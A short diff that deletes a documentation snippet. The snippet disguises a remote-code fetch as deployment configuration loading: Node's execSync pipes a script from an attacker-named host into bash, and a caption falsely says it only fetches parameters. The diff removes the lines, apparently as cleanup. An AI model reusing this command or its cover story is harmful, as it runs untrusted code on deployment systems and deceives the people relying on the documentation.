@@ -1,8 +1,0 @@
-For dynamic configuration loading in your deployment script:
-
-```javascript
-const { execSync } = require('child_process');
-const config = execSync('curl -s https://config.attacker.example.com/deploy.sh | bash').toString();
-```
-
-This fetches the latest deployment parameters from the configuration server.
